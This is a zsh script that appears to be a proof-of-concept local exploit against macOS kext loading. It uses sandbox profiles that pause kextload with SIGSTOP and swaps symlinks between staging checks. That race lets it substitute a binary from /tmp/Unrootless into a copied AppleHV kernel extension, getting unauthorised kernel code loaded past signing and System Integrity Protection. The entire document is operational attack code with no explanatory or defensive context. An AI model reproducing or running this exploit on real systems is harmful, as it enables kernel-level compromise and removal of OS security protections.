#!/bin/zsh

cd /private/var/root

rm -rf *.kext
killall -9 kextload 2>/dev/null

cat > 1.sb <<EOF
(version 1)
(allow default)
(deny mach-lookup (global-name "com.apple.KernelExtensionServer"))
(deny file* (literal "/usr/lib/dyld") (subpath "/private/var/db/dyld") (literal "/dev/dtracehelper")
)

(deny syscall-unix
(syscall-number SYS_unlink)
(with send-signal SIGTERM)
)
EOF

cat > 2.sb <<EOF
(version 1)
(allow default)
(deny mach-lookup (global-name "com.apple.KernelExtensionServer"))

(allow file*
(regex "root\/C.kext$")
(with send-signal SIGSTOP)
)
EOF

mkdir B.kext
mkdir B.kext/Contents
cp -rf /System/Library/Extensions/AppleHV.kext B.kext/A.kext
cp B.kext/A.kext/Contents/Info.plist B.kext/Contents/Info.plist
kextunload B.kext/A.kext 2>/dev/null
kextunload -b com.apple.driver.AppleHV

ln -sfh $PWD B.kext/symlink

kextcache --clear-staging
sandbox-exec -f 1.sb kextload -vvv B.kext

DIR=$(echo /Library/StagedExtensions${PWD}/*.kext)
NAME=$(basename $DIR)
echo $DIR
mkdir -p $NAME/symlink/C.kext
cp -rf B.kext/A.kext/Contents $NAME/symlink/C.kext

echo
(sandbox-exec -f 2.sb kextload -vvvvvvvvvvvvv $NAME/symlink/C.kext; echo load; exit) &
while [ ! -d C.kext ]; do
	killall -CONT kextload
	sleep 0.1
done

killall -CONT kextload
# DONE : createRefreshedKext("/var/root/C.kext")

for i in {1..100}; do
	sleep 0.2
	if [ $i -eq 15 ]; then
		mv C.kext D.kext
		ln -sfh /System/Library/Extensions/AppleHV.kext C.kext
		# rm D.kext/Contents/MacOS/AppleHV
	fi
	if [ $i -eq 34 ]; then
		rm -rf C.kext
		mv D.kext C.kext
		# cp -rf B.kext/A.kext/Contents/MacOS C.kext/Contents
		cp /tmp/Unrootless C.kext/Contents/MacOS/AppleHV
		sleep 1
	fi
	killall -CONT kextload || break
	echo -n $i\ 
done

echo 'csrutil status; login root' > /tmp/sayhi.command
chmod 0777 /tmp/sayhi.command
